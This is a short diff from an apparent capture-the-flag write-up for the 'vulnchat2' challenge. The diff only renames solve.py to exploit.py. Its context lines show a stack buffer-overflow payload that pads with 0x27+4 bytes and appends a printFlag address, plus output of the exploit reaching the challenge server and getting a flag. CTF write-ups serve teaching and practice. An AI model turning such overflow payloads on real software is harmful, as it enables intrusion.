@@ -56,7 +56,7 @@ int doThings()
 `read(0, &buf, 0x2Du);`  
 `payload = "1" * (0x27 + 4) + printFlag()`  
 ```bash
-# python solve.py
+# python exploit.py
 [+] Opening connection to vulnchat2.tuctf.com on port 4242: Done
 [*] Switching to interactive mode
 djinn: Alright here's you flag:
